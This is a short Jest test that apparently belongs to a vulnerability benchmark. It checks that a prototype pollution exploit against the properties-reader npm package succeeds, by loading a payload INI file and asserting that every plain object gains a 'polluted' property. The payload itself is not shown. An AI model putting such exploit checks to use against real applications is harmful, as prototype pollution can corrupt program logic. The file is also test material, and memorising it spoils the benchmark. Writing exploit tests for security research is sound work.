test("Prototype pollution in properties-reader", () => {
  const { exploitFunction } = require("./function.js");
  const { getPayload } = require('./payload.js');

  const payload = getPayload();
  exploitFunction("./payload.ini");

  expect({}.polluted).toBe("yes");
});